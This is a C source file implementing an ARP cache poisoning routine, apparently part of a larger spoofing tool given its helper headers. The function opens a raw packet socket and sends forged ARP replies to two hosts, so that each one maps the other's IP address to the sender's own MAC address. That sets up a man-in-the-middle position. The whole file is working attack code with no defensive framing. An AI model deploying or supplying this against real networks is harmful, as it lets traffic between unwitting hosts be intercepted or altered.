#include <stdio.h>
#include <sys/types.h> // for u_char
#include <arpa/inet.h> // for htons, inet_addr
#include <stdlib.h> // for exit
#include <string.h> // for strncpy
#include "find_ethernet_address.h"
#include "arp_reply.h"
#include "arp_cache_poison.h"

void arp_cache_poison(char *interface_name,
	u_char *target1_ethernet_address, u_char *target1_ip_address,
	u_char *target2_ethernet_address, u_char *target2_ip_address) {

	int send_socket = socket(AF_INET, SOCK_PACKET, htons(ETH_P_ARP));
	if(send_socket < 0) {
		printf("Failed to create send socket for arpreply.\n");
		exit(1);
	}

	struct sockaddr sockaddr;
	strncpy(sockaddr.sa_data, interface_name, sizeof(sockaddr.sa_data));

	u_char *own_ethernt_address = find_ethernet_address(interface_name);

	u_char *target2_spoof_packet = 
		spoofed_arp_reply(own_ethernt_address, target1_ip_address, target2_ethernet_address, target2_ip_address);
		
	if(sendto(send_socket, target2_spoof_packet, get_arp_reply_size(), 0, &sockaddr, sizeof(sockaddr)) < 0) {
		printf("Failed to send arpreply.\n");
		exit(1);
	}

	u_char *target1_spoof_packet = 
		spoofed_arp_reply(own_ethernt_address, target2_ip_address, target1_ethernet_address, target1_ip_address);

	if(sendto(send_socket, target1_spoof_packet, get_arp_reply_size(), 0, &sockaddr, sizeof(sockaddr)) < 0) {
		printf("Failed to send arpreply.\n");
		exit(1);
	}
}